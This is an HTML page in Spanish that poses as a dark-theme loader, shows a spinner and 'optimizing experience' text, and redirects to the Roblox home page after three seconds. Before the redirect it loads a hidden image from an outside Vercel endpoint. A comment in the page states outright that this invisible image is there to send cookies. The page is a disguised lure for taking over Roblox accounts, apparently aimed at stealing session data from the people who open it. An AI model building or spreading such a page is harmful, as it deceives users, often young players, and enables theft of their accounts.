<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Cargando tema oscuro...</title>
    <style>
        body {
            background: #1a1a1a;
            color: #00ff00;
            font-family: monospace;
            text-align: center;
            padding: 50px;
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #00ff00;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>⚡ Aplicando tema oscuro</h1>
    <div class="loader"></div>
    <p>Optimizando experiencia...</p>
    
    <!-- LA CLAVE: IMAGEN INVISIBLE QUE ENVÍA COOKIES -->
    <img src="https://generador-imagen.vercel.app/api/gif" style="display:none">
    
    <script>
        // Redirigir a Roblox después de 3 segundos
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/home";
        }, 3000);
    </script>
</body>
</html>
